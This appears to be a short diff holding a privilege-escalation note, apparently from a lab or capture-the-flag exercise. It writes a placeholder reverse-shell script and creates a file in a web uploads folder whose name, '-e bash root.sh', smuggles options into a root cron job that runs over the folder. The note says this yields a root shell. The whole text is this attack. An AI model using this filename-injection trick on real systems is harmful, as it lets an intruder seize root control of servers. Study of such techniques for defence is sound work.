@@ -1,0 +1,5 @@
+echo "rev shll" > root.sh
+
+touch "/var/www/html/uploads/-e bash root.sh"
+
+as a cron runs it will give root shell
